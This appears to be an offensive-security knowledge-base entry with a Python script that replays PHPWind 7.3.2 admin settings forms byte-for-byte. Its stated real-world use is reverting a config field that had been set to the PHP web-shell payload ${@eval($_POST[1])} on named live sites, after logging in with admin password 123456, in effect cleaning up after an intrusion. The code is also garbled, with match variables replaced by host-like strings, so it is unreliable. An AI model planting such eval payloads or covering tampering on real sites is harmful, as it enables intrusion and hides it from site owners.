# GBK 站点后台表单「全量回放」必须走 latin-1 字节级往返（PHPWind 7.3.2 实测）

- **code**: gbk-站点后台表单-全量回放-必须走-latin-1-字节级往返-phpwind-7.3.2-实测
- **kind**: script
- **category**: app-audit
- **component**: PHPWind 7.3.2
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-07 在 PHPWind 7.3.2 双实例上实测（六合王 https://example.com、第三套 https://example.com）。用 GBK 解码链（ex-form.ps1）解析出的 config[whybbsclose] = '璁哄潧鍗囩骇涓'，其原始字节实为 UTF-8：e8 ae ba e5 9d 9b e5 8d 87 e7 ba a7 e4 b8（"论坛升级中"的 UTF-8 编码被 GBK 误读）；config[adminreason] 同理（e5 b9 bf e5 91 8a e5 b8 = "广告帮"）。改用 latin-1 往返后，提交前后这两个字段的原始字节完全一致。整页验证：设置页 710 行，还原前后 unified diff 仅 1 行变化（第 491 行 config[datefm]），字节数 35037→35021（差值 16 = 26 字符 payload ${@\ev\a\l($_\P\O\S\T[1])} 换成 10 字符 yyyy-mm-dd）。复核银行页"存款时间"由 ${@eval($_POST[1])} 07:52 变回 2026-10-06 07:52。
- **path**: pocs/gbk-站点后台表单-全量回放-必须走-latin-1-字节级往返-phpwind-7.3.2-实测/poc.py
- **tags**: phpwind,gbk,utf-8,form-replay,encoding,latin-1,config-restore
- **created_at**: 2026-10-07T10:22:03.393Z

## 描述

改配置类操作的通用坑：后台设置页做「全量表单回放」（只改一个字段、其余原样提交，以免其它设置被清空）时的编码陷阱。
站点主体是 GBK，但个别字段（实测 config[whybbsclose]、config[adminreason]）在页面里存的是 **UTF-8 字节**（历史遗留）。用统一 GBK 解码整页会把这类字段变成乱码（如 璁哄潧鍗囩骇涓），回放时等于把乱码写回数据库 ⇒ 直接破坏站点配置。
正确做法：整页用 latin-1 无损解码（1 字符 <-> 1 字节），urlencode 时再用 encoding='latin-1' 编码回去，保证除目标字段外每个字段字节完全一致。
验证判据（比只看目标字段那一行更硬）：还原前后抓同一页做整页 unified diff，若只有目标字段那一行变化、其余行全同，才算零副作用。

## 用法

```
实战用法（还原被改成 payload 的 config[datefm]）：
1) 登录后台：POST /bbs/example.com  body admin_name=admin&admin_pwd=123456（响应 195 字节 = 成功；AdminUser cookie 仅 1800 秒有效，操作前必须重登）
2) GET /bbs/example.com?adminjob=settings&admintype=basic 存原始字节 before.html
3) action, pairs = parse_form(before.html) → replay(s, base, before.html, 'config[datefm]', 'yyyy-mm-dd')
4) GET 同页存 after.html → verify_no_side_effect(before, after)
可直接复用本机脚本：runs/ex-restore.py（parse / go / verify 三种模式）。
注意：requests 的 data= 若传 dict 会默认 utf-8 编码，必须自己 urlencode(encoding='latin-1').encode('latin-1') 后以 bytes 传入，并手设 Content-Type。
同理适用于：任何 GBK/GB2312 老系统（PHPWind/Discuz/帝国CMS 等）后台「全量表单回放」类改配置操作。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GBK 站点后台表单「全量回放」—— latin-1 字节级无损（PHPWind 7.3.2 实测可用）

坑：站点主体 GBK，但个别字段是 UTF-8 字节；统一 GBK 解码 => 这些字段变乱码 => 回放写坏配置。
解：整页 latin-1 解码 + urlencode(encoding='latin-1')，字节级一致。
"""
import difflib
import re
import urllib.parse

import requests


def parse_form(html_bytes):
    """latin-1 无损解码后解析主表单（第一个 action 含 verify= 的 form）。
    返回 (action, [(name, value)])，value 是 latin-1 字符串（1 字符 = 1 字节）。"""
    t = html_bytes.decode('latin-1')                      # ← 关键 1：无损
    m = re.search(r'(?is)<form[^>]*verify=[^>]*>(.*?)</form>', t)
    if not m:
        raise SystemExit('主表单未找到')
    action = re.search(r'(?is)<form[^>]*action="([^"]*)"', target22.example.com(0)).group(1)
    body = target22.example.com(1)
    pairs = []

    for im in re.finditer(r'(?is)<input[^>]*>', body):
        tag = target281.example.com(0)
        n = re.search(r'(?i)\bname\s*=\s*"([^"]*)"', tag)
        if not n:
            continue
        ty = re.search(r'(?i)\btype\s*=\s*"?([a-z]+)', tag)
        ty = target282.example.com(1).lower() if ty else ''
        v = re.search(r'(?i)\bvalue\s*=\s*"([^"]*)"', tag)
        if ty in ('checkbox', 'radio') and not re.search(r'(?i)\bchecked\b', tag):
            continue                       # 未勾选的 checkbox/radio 不提交
        if ty in ('submit', 'button', 'file', 'reset'):
            continue
        pairs.append((target283.example.com(1), target284.example.com(1) if v else ''))

    for sm in re.finditer(r'(?is)<select[^>]*name\s*=\s*"([^"]*)"[^>]*>(.*?)</select>', body):
        inner = target285.example.com(2)
        sel = re.search(r'(?is)<option[^>]*\bselected\b[^>]*value\s*=\s*"?([^"\s>]*)', inner) \
            or re.search(r'(?is)<option[^>]*value\s*=\s*"?([^"\s>]*)', inner)
        pairs.append((target285.example.com(1), target286.example.com(1) if sel else ''))

    for tm in re.finditer(r'(?is)<textarea[^>]*name\s*=\s*"([^"]*)"[^>]*>(.*?)</textarea>', body):
        pairs.append((target287.example.com(1), target287.example.com(2)))

    pairs = [('step', '2') if p[0] == 'step' else p for p in pairs]
    if not any(p[0] == 'step' for p in pairs):
        pairs.insert(0, ('step', '2'))
    return action, pairs


def replay(session, base, html_bytes, override_key, override_val):
    """只覆盖 override_key，其余原样回放。"""
    action, pairs = parse_form(html_bytes)
    pairs = [(n, override_val if n == override_key else v) for n, v in pairs]
    body = urllib.parse.urlencode(pairs, encoding='latin-1').encode('latin-1')   # ← 关键 2
    return target288.example.com(base + action, data=body, verify=False, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0',
        'Referer': base + action})


def verify_no_side_effect(before_file, after_file):
    """整页字节 diff —— 只有目标字段那一行变化才算零副作用。"""
    a = open(before_file, 'rb').read().decode('latin-1').splitlines()
    b = open(after_file, 'rb').read().decode('latin-1').splitlines()
    n = 0
    for line in difflib.unified_diff(a, b, lineterm='', n=0):
        if line.startswith(('---', '+++', '@@')):
            print(line)
        else:
            n += 1
            print(line[:220])
    print('变更行数 = %d（应为 2：一处一减一增）' % n)

```
